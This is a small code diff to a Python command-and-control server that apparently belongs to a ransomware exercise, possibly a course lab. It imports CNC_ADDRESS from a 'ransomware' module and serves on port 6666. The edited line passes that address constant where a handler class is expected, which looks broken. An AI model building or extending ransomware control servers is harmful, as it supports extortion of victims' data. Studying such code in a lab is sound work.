@@ -2,6 +2,7 @@ import base64
 from hashlib import sha256
 from http.server import HTTPServer
 import os
+from TD.sources.ransomware import CNC_ADDRESS
 
 from cncbase import CNCBase
 
@@ -22,5 +23,5 @@ class CNC(CNCBase):
         return {"status":"KO"}
 
            
-httpd = HTTPServer(('0.0.0.0', 6666), CNC)
+httpd = HTTPServer(('0.0.0.0', 6666), CNC_ADDRESS)
 httpd.serve_forever()
